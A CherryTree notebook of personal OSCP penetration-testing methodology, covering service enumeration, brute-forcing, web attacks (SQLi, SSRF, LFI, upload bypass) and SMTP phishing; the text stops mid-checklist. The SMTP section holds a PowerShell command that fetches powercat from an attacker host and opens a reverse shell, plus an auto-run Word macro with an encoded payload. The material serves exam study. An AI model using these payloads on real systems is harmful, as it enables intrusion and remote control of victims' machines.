<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="OSCP Methodology" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="11" is_bold="1" foreground="" ts_creation="1569564485" ts_lastsave="1689414521">
    <rich_text>Use this manual: </rich_text>
    <rich_text link="webs https://book.hacktricks.xyz">https://book.hacktricks.xyz</rich_text>
    <rich_text>
Reverse shell cheatsheet: </rich_text>
    <rich_text link="webs https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</rich_text>
    <rich_text>
Reverse shell generator: </rich_text>
    <rich_text link="webs https://www.revshells.com/">https://www.revshells.com/</rich_text>
    <node name="Initial Recon" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="14" is_bold="0" foreground="" ts_creation="1569560343" ts_lastsave="1694629780">
      <rich_text>OS Check (NMap):
</rich_text>
      <rich_text justification="left"></rich_text>
      <codebox char_offset="17" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap -O {IP}</codebox>
      <node name="ENUM" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1572497353" ts_lastsave="1688827326">
        <rich_text>Start deep enum process with AutoRecon.py (https://github.com/Tib3rius/AutoRecon.git):
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

Enumerate again every port (NMap):
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

Enumerate every service (NMap):
</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="87" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">python3 autorecon.py -o {output directory} {IP} -vv</codebox>
        <codebox char_offset="125" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap -p- {IP}</codebox>
        <codebox char_offset="160" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap -p {service port} {IP}</codebox>
      </node>
      <node name="VULN &amp; EXPLOIT CHECK" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1572497437" ts_lastsave="1688828328">
        <rich_text>For every service found, we have to check the version on:
- ExploitDB
- SearchSploit
- Rapid7

For every port with unidentified service we have to check “</rich_text>
        <rich_text weight="heavy">port number + exploit</rich_text>
        <rich_text>”  and check EVERY exploit for working.
When an exploit is in Python2, we either:
- repair it easily
- get an existing updated version from issues or other branches in GitHub/GitLab etc.

If an exploit gives us patched message or doesn't work, WE HAVE TO CHECK ANOTHER ONE, SAME SERVICE TO MAKE SURE THAT SERVICE IS UNEXPLOITABLE.</rich_text>
      </node>
    </node>
    <node name="SERVICE ENUM " unique_id="76" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="39" is_bold="0" foreground="" ts_creation="1579569598" ts_lastsave="1694288200">
      <rich_text>We have to enumerate every service and gather as much information as possible.

!For file transfer:
Linux:
- curl
- scp

Windows:
- curl
- certutil (use this, </rich_text>
      <rich_text weight="heavy">better than curl</rich_text>
      <rich_text>)
- scp


[INTERESTING CASES]
If the shell must not contains spaces, use </rich_text>
      <rich_text weight="heavy">${IFS}</rich_text>
      <rich_text> which is a new line.
Example:
</rich_text>
      <rich_text justification="left"></rich_text>
      <codebox char_offset="285" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">echo "" |base64 -d | bash</codebox>
      <node name="TCP" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1569559292" ts_lastsave="1694351984">
        <rich_text>We will find the service report from AutoRecon.py, name Full TCP Scan.

Pay attention on </rich_text>
        <rich_text weight="heavy">port knocking</rich_text>
        <rich_text> - </rich_text>
        <rich_text link="webs https://refabr1k.gitbook.io/oscp/info-gathering/port-knocking">https://refabr1k.gitbook.io/oscp/info-gathering/port-knocking</rich_text>
        <rich_text>
File to resaerch on it: </rich_text>
        <rich_text style="italic">/etc/knockd.conf</rich_text>
        <rich_text>.</rich_text>
        <node name="FTP" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569560997" ts_lastsave="1688829046">
          <rich_text>- find the version, maybe it's a vulnerable one
- check if we are allowed anonymous login (user: anonymous)
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
- get the certificate, if any
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

We can try brute-force with Hydra (any username that we may find):
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

More possible exploits here: </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp</rich_text>
          <codebox char_offset="108" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo nmap -sV -p21 -sC -A {IP}</codebox>
          <codebox char_offset="140" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">openssl s_client -connect crossfit.htb:21 -starttls ftp</codebox>
          <codebox char_offset="210" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -l {username} -P {wordlist} {IP} ftp</codebox>
        </node>
        <node name="SSH" unique_id="48" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569559597" ts_lastsave="1688829327">
          <rich_text>- check vulnerable version, some may allow </rich_text>
          <rich_text style="italic">username enumeration</rich_text>
          <rich_text> time-based
- audit the entire service using SSH-audit (</rich_text>
          <rich_text link="webs https://github.com/jtesta/ssh-audit">https://github.com/jtesta/ssh-audit</rich_text>
          <rich_text>)

We can try brute-force with Hydra (any username that we may find):
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

More possible exploits here: </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh</rich_text>
          <codebox char_offset="224" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -l {username} -P {wordlist} {IP} ftp</codebox>
        </node>
        <node name="DNS" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1688829378" ts_lastsave="1688829832">
          <rich_text>- try zone transfer
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
- try reverse IP lookup
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
More exploits: </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns">https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns</rich_text>
          <rich_text> </rich_text>
          <codebox char_offset="20" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dig axfr @&lt;DNS_IP&gt;
dig axfr @&lt;DNS_IP&gt; &lt;DOMAIN&gt;</codebox>
          <codebox char_offset="46" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dig -x {IP} @&lt;DNS_IP&gt;</codebox>
        </node>
        <node name="HTTP" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569558367" ts_lastsave="1694461422">
          <rich_text>We have to </rich_text>
          <rich_text weight="heavy">Dirbust</rich_text>
          <rich_text> and </rich_text>
          <rich_text weight="heavy">Feroxbust</rich_text>
          <rich_text> using good wordlists:
- /usr/share/seclists/Discovery/Web-Content/big.txt
- /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
- /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt (let it </rich_text>
          <rich_text weight="heavy">run in background</rich_text>
          <rich_text> while testing other stuff)
- /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
</rich_text>
          <rich_text weight="heavy">Dirsearch</rich_text>
          <rich_text> everytime.

Also we have to check:
- always check server headers (maybe there is a vulnerable server, maybe there is another thing interesting)
- intersting exntensions (</rich_text>
          <rich_text style="italic">docx</rich_text>
          <rich_text>, </rich_text>
          <rich_text style="italic">pdf</rich_text>
          <rich_text>, </rich_text>
          <rich_text style="italic">txt</rich_text>
          <rich_text>, </rich_text>
          <rich_text style="italic">php</rich_text>
          <rich_text>, </rich_text>
          <rich_text style="italic">sql</rich_text>
          <rich_text>) - </rich_text>
          <rich_text weight="heavy">ferox -x php,html,txt, jsp (Tomcat)</rich_text>
          <rich_text>
- we have to check recursive
- check if git is present on the server
- check page contents, maybe credentials or something helpful is already there
- check comments
- check cookies and session
- </rich_text>
          <rich_text weight="heavy">FUZZ</rich_text>
          <rich_text> suspect endpoints; use wordlists from </rich_text>
          <rich_text style="italic">/usr/share/seclists/Fuzzing</rich_text>
          <rich_text>
   → try base64
   → try URL encoded
- When something does not work, use incognito, maybe it will work from there
- check for enabled sited in: 
   → </rich_text>
          <rich_text weight="heavy">/etc/apache2/sites-enabled/000-default.conf</rich_text>
          <rich_text> (Apache2)
   → </rich_text>
          <rich_text weight="heavy">/etc/nginx/sites-available</rich_text>
          <rich_text> (Nginx)

SPECIAL CASE:
- Tomcat Apache =&gt; we need to access </rich_text>
          <rich_text style="italic">/manager/html</rich_text>
          <rich_text> in order to upload a </rich_text>
          <rich_text weight="heavy">malicious war</rich_text>
          <rich_text>
- Tomcat Apache =&gt; search for </rich_text>
          <rich_text weight="heavy">jsp extension</rich_text>
          <rich_text> using ferox

</rich_text>
          <rich_text weight="heavy">!Note:</rich_text>
          <rich_text> We can use burp bind port to use our localhost as the webserver and burp will redirect anything on the target (good for debugging), so no proxy will be involved.</rich_text>
          <node name="SQL injections" unique_id="60" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1572496816" ts_lastsave="1694629495">
            <rich_text>- check with quote “ ' ”
- check the request in network tab for errors
- check for time differences between </rich_text>
            <rich_text weight="heavy">normal requests</rich_text>
            <rich_text> and </rich_text>
            <rich_text weight="heavy">ones that may have errors</rich_text>
            <rich_text>
- check which permissions has MySQL (maybe it runs as </rich_text>
            <rich_text weight="heavy">root</rich_text>
            <rich_text>) - can be seen in permissions of the file that is created by MySQL
	=&gt; If runs as root, we can </rich_text>
            <rich_text weight="heavy">exfiltrate any file from the system</rich_text>
            <rich_text>.
- </rich_text>
            <rich_text style="italic">/var/lib/mysql</rich_text>
            <rich_text> always </rich_text>
            <rich_text weight="heavy">writable by MySQL</rich_text>
            <rich_text> (maybe we can write via SQLi and LFI the payload?)

More on SQL injections:
- </rich_text>
            <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/sql-injection">https://book.hacktricks.xyz/pentesting-web/sql-injection</rich_text>
            <rich_text>
- </rich_text>
            <rich_text link="webs https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</rich_text>
            <rich_text>
</rich_text>
          </node>
          <node name="SSRF" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1572496888" ts_lastsave="1693134424">
            <rich_text>- if Windows, we can capture the Kerberos Ticket using Responder and SSRF (make sure to use </rich_text>
            <rich_text weight="heavy">without </rich_text>
            <rich_text style="italic" weight="heavy">-b</rich_text>
            <rich_text weight="heavy"> option</rich_text>
            <rich_text> also)
- we can check for firwalls by checkinf if we get a request on more stranger ports (open a HTTP server on our machine on 4444 and try to get a request)
- try requesting localhost =&gt; if we get a specific agent, maybe we will find an exploit for it

For internal port scanning using SSRF, we can use WFUZZ.
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

More on that here: </rich_text>
            <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery">https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery</rich_text>
            <rich_text>

It is also used to get inner services =&gt; we can request </rich_text>
            <rich_text link="webs http://127.0.0.1:21">http://127.0.0.1:21</rich_text>
            <rich_text> and if the connection is refused, then the box does not have FTP running internal (just an example). Check this: </rich_text>
            <rich_text link="webs https://www.resecurity.com/blog/article/blind-ssrf-to-rce-vulnerability-exploitation">https://www.resecurity.com/blog/article/blind-ssrf-to-rce-vulnerability-exploitation</rich_text>
            <codebox char_offset="421" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wfuzz -c -z range,1-65535 --hl=2 http://{IP}:8080/?url.php?path=127.0.0.1:FUZZ</codebox>
          </node>
          <node name="LFI &amp; RFI" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688830874" ts_lastsave="1694352028">
            <rich_text>- we can try to include shells from our server
[For LFI] we can poison the access logs requiresting </rich_text>
            <rich_text link="webs http://url/malicious-payload">http://url/malicious-payload</rich_text>
            <rich_text> then we can include the apache access log in order to execute the PHP payload that we included in it
Places for </rich_text>
            <rich_text weight="heavy">access.log</rich_text>
            <rich_text> </rich_text>
            <rich_text style="italic">/var/log/apache/access. log</rich_text>
            <rich_text>.

- see if there is an </rich_text>
            <rich_text weight="heavy">upload functionality</rich_text>
            <rich_text> to mix with LFI vulnerability

- check for enabled sited in: </rich_text>
            <rich_text weight="heavy">/etc/apache2/sites-enabled/000-default.conf</rich_text>
            <rich_text> (Apache2)

Check </rich_text>
            <rich_text weight="heavy">firewall file on Linux</rich_text>
            <rich_text>: </rich_text>
            <rich_text style="italic">/etc/ufw/user.rules</rich_text>
            <rich_text>, help to get a port for the reverse shell.

More on that here: </rich_text>
            <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/file-inclusion">https://book.hacktricks.xyz/pentesting-web/file-inclusion</rich_text>
          </node>
          <node name="Upload Feature" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688830881" ts_lastsave="1694629446">
            <rich_text>- We can try to get the </rich_text>
            <rich_text weight="heavy">Kerberos Ticket</rich_text>
            <rich_text> with </rich_text>
            <rich_text weight="heavy">Responder</rich_text>
            <rich_text> by catching the </rich_text>
            <rich_text weight="heavy">request used to upload</rich_text>
            <rich_text>, and </rich_text>
            <rich_text weight="heavy">changing the path of the file we want to upload to our responder server</rich_text>
            <rich_text>
- We can try uplading reverse shells

</rich_text>
            <rich_text weight="heavy">!Important:</rich_text>
            <rich_text> If we are able to upload </rich_text>
            <rich_text weight="heavy">.htaccess</rich_text>
            <rich_text>, we can make any file extension executable.
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

For upload zip functionality, we can force an arbitrary file read via </rich_text>
            <rich_text weight="heavy">zipping a symlink</rich_text>
            <rich_text> (if the website unzips our upload):
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

Bypass methods for upload protection: 
- </rich_text>
            <rich_text link="webs https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass">https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass</rich_text>
            <rich_text>
- </rich_text>
            <rich_text link="webs https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/file-upload-bypass">https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/file-upload-bypass</rich_text>
            <rich_text>

More on that here: </rich_text>
            <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/file-upload">https://book.hacktricks.xyz/pentesting-web/file-upload</rich_text>
            <codebox char_offset="300" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">AddType application/x-httpd-php .anything</codebox>
            <codebox char_offset="427" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ln -s /var/www/html/shop/product.php lol.pdf
zip --symlink lol.zip lol.pdf</codebox>
          </node>
          <node name="Wordpress" unique_id="121" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693945561" ts_lastsave="1693945670">
            <rich_text>Enumerate </rich_text>
            <rich_text weight="heavy">plugins</rich_text>
            <rich_text>, </rich_text>
            <rich_text weight="heavy">versions</rich_text>
            <rich_text> and </rich_text>
            <rich_text weight="heavy">themes</rich_text>
            <rich_text>:
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

Enumerate </rich_text>
            <rich_text weight="heavy">users</rich_text>
            <rich_text>:
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text weight="heavy">Bruteforce</rich_text>
            <rich_text> using discovered users:
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="40" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wpscan --url {URL}</codebox>
            <codebox char_offset="60" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wpscan --url {URL} -e u</codebox>
            <codebox char_offset="98" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wpscan --url {url} -U users.txt -P /usr/share/wordlist/rockyou.txt
# this will use XMLRPC.PHP</codebox>
          </node>
          <node name="STUCK?" unique_id="118" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1691569520" ts_lastsave="1691569562">
            <rich_text>- Dirbust one more time, each directory found in particular
- Dirbust by extensions (ex.: PHP)
- Try using POST params as GET</rich_text>
          </node>
        </node>
        <node name="SMTP" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1688922291" ts_lastsave="1693208687">
          <rich_text>We can use </rich_text>
          <rich_text weight="heavy">Evolution</rich_text>
          <rich_text> as a </rich_text>
          <rich_text weight="heavy">SMTP UI client</rich_text>
          <rich_text>.

- Check the version, some exim versions might be VULNERABLE.
- Check for </rich_text>
          <rich_text weight="heavy">username enumeration</rich_text>
          <rich_text>

This might be a sign that we can trigger initial intrusion using a client-side attack
We can create a </rich_text>
          <rich_text weight="heavy">config.Library-ms</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Then we can run to start hosting a WebDav server:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
And inside we must create a shortcut that will download PowerCat and start a reverse shell (note that we also have to start a server on port 8000 to host PowerCat):
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

For Word Macros. check this example:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

For more check here: </rich_text>
          <rich_text link="webs https://github.com/glowbase/macro_reverse_shell">https://github.com/glowbase/macro_reverse_shell</rich_text>
          <rich_text>

We can send emails of the client side attacks using SWAKS:
</rich_text>
          <rich_text link="webs https://www.kali.org/tools/swaks/">https://www.kali.org/tools/swaks/</rich_text>
          <rich_text>
Example:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <rich_text style="italic">--suppress-data</rich_text>
          <rich_text> Summarizes the DATA portion of the SMTP transaction instead of
           printing every line
</rich_text>
          <rich_text style="italic">-ap</rich_text>
          <rich_text> is for providing auth passwords

Or by using </rich_text>
          <rich_text weight="heavy">sendemail</rich_text>
          <rich_text>:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Check this methodology: </rich_text>
          <rich_text link="webs https://fareedfauzi.gitbook.io/oscp-playbook/services-enumeration/smtp">https://fareedfauzi.gitbook.io/oscp-playbook/services-enumeration/smtp</rich_text>
          <codebox char_offset="258" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
&lt;version&gt;6&lt;/version&gt;
&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
&lt;templateInfo&gt;
&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
&lt;/templateInfo&gt;
&lt;searchConnectorDescriptionList&gt;
&lt;searchConnectorDescription&gt;
&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
&lt;isSupported&gt;false&lt;/isSupported&gt;
&lt;simpleLocation&gt;
&lt;url&gt;http://{Our IP}&lt;/url&gt;
&lt;/simpleLocation&gt;
&lt;/searchConnectorDescription&gt;
&lt;/searchConnectorDescriptionList&gt;
&lt;/libraryDescription&gt;</codebox>
          <codebox char_offset="311" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/</codebox>
          <codebox char_offset="478" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://{our IP}:8000/powercat.ps1');
powercat -c {our IP} -p 4444 -e powershell"</codebox>
          <codebox char_offset="518" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub</codebox>
          <codebox char_offset="693" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">swaks -t {to email} --from {from email} --attach {local file to attach} --server {IP of SMTP server} --body {txt file with body contents}
--header "Subject: Example" --suppress-data -ap</codebox>
          <codebox char_offset="865" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sendemail -f 'jonas@localhost' \
                       -t 'mailadmin@localhost' \
                       -s 192.168.120.132:25 \
                       -u 'Your spreadsheet' \
                       -m 'Here is your requested spreadsheet' \
                       -a bomb.ods</codebox>
        </node>
        <node name="MSSQL" unique_id="112" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1689500078" ts_lastsave="1689507889">
          <rich_text>Port - 1433
To use: </rich_text>
          <rich_text style="italic">impacket-mssqlclient</rich_text>
          <rich_text>
Check this RCE using impacket-mssqlclient: </rich_text>
          <rich_text link="webs https://rioasmara.com/2020/05/30/impacket-mssqlclient-reverse-shell/">https://rioasmara.com/2020/05/30/impacket-mssqlclient-reverse-shell/</rich_text>
          <rich_text>
Also the official Kali documentation: </rich_text>
          <rich_text link="webs https://www.kali.org/tools/impacket-scripts/#impacket-mssqlclient">https://www.kali.org/tools/impacket-scripts/#impacket-mssqlclient</rich_text>
          <rich_text>

More documentation on: </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server</rich_text>
          <rich_text>

</rich_text>
          <rich_text weight="heavy">Very important: </rich_text>
          <rich_text>When logging in with a Windows User, use </rich_text>
          <rich_text weight="heavy">windows-auth</rich_text>
          <rich_text> flag in </rich_text>
          <rich_text weight="heavy">impacket-mssqlclient</rich_text>
        </node>
        <node name="LDAP" unique_id="113" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1689500233" ts_lastsave="1691956558">
          <rich_text>Port - 389 or 636 (for LDAPs - secure)
Use </rich_text>
          <rich_text style="italic">ldapsearch</rich_text>
          <rich_text> to enumerate:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

We can also use </rich_text>
          <rich_text style="italic">ldapdomaindump</rich_text>
          <rich_text> to enumerate LDAP.

Also, do not forget to </rich_text>
          <rich_text weight="heavy">grep</rich_text>
          <rich_text> for:
- </rich_text>
          <rich_text style="italic">DefaultPassword</rich_text>
          <rich_text>
- </rich_text>
          <rich_text style="italic">Password</rich_text>
          <rich_text>
- Pwd

Classic methodology for LDAPSearch:
1. Get user list
2. Try to find a default password, or leaked password

More on it here: </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap</rich_text>
          <codebox char_offset="68" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -x -b "dc=domain,dc=com" -H ldap://{IP}</codebox>
        </node>
      </node>
      <node name="UDP" unique_id="73" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1569559301" ts_lastsave="1579569609">
        <rich_text>[ NMAP OVERVIEW ]</rich_text>
        <node name="SNMP" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569560995" ts_lastsave="1693404666">
          <rich_text>Before searching, it might be useful to update our MIB:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>s

</rich_text>
          <rich_text weight="heavy">AutoRecon.py</rich_text>
          <rich_text> will enumerate the service.
Check out:
- onesixtyone
- snmpwalk
- snmp-check (</rich_text>
          <rich_text weight="heavy">always use this tool also</rich_text>
          <rich_text>)

Enumerate the last command executed:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
Also check RCE with SNMP (requires community string with write permissions): </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce">https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce</rich_text>
          <rich_text>
Also check this out: </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp</rich_text>
          <codebox char_offset="56" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo download-mibs
# This will use /etc/snmp-mibs-downloader to download files from those config files.</codebox>
          <codebox char_offset="216" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">snmpwalk -v 1 -c {community string} {IP} NET-SNMP-EXTEND-MIB::nsExtendOutputFull</codebox>
        </node>
      </node>
      <node name="STUCK?" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1569563263" ts_lastsave="1694629569">
        <rich_text weight="heavy">Things to consider</rich_text>
        <rich_text>
- Have you confirmed the service on the port manually and googled all the things (the SSH string, the banner text, the source)?
- Is there a service that will allow you to enumerate something useful (i.e. usernames) but maybe doesn't make that obvious (e.g. RID brute-force through SMB with crackmapexec or lookupsid.py)?
- Have you used the best wordlist possible for your tasks (is there a better/bigger directory list? Is there a SecLists cred list for this service?)
- Have you fuzzed the directories you have found for a) more directories, or b) common filetypes -x php,pl,sh,etc
- Have you tried some manual testing (MySQL, wireshark inspections)
- Have you collected all the hashes</rich_text>
        <rich_text weight="heavy"> and cracked them</rich_text>
        <rich_text>?
- Have you tried ALL COMBINATIONS of the username/passwords and not just the pairs given? Have you tried them across all services/apps?
- Do the version numbers tell you anything about the host?
- Have you tried bruteforce (</rich_text>
        <rich_text weight="heavy">cewl</rich_text>
        <rich_text> - use it on the main page, </rich_text>
        <rich_text weight="heavy">patator</rich_text>
